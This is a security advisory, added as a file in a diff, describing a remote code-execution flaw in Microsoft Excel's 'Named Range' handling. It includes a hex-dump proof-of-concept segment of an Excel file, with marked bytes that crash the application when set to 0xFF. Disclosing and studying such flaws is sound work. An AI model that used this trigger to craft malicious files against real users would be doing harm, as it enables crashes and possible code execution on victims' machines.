@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/15780/info
+
+Microsoft Excel is susceptible to a remote code-execution vulnerability. This issue was originally disclosed through an eBay auction that has since been terminated.
+
+This issue is due to the application's failure to properly bounds-check user-supplied input data in the 'Named Range' definition in Excel data files. This results in the corruption of critical memory sections, allowing code execution. 
+
+The following is a proof-of-concept example segment of an Excel data file. The '*' characters represent the location of the affected value that triggers this issue. Setting these locations to '0xFF' will crash the application.
+
+00000720 00 80 00 ff 93 02 04 00 14 80 05 ff 60 01 02 00 |............`...|
+00000730 00 00 85 00 0e 00 ba 05 00 00 00 00 06 00 53 68 |..............Sh|
+00000740 65 65 74 31 8c 00 04 00 01 00 01 00 ae 01 04 00 |eet1............|
+00000750 01 00 01 04 17 00 08 00 01 00 00 00 00 00 00 00 |................|
+00000760 18 00 1b 00 00 00 00 05 07 ** ** 00 00 00 00 00 |................|
+00000770 00 00 00 54 45 53 54 31 3a 00 00 00 00 00 00 c1 |...TEST1:.......|
+00000780 01 08 00 c1 01 00 00 22 be 01 00 fc 00 08 00 00 |......."........|
+00000790 00 00 00 00 00 00 00 ff 00 02 00 08 00 63 08 15 |.............c..|
+
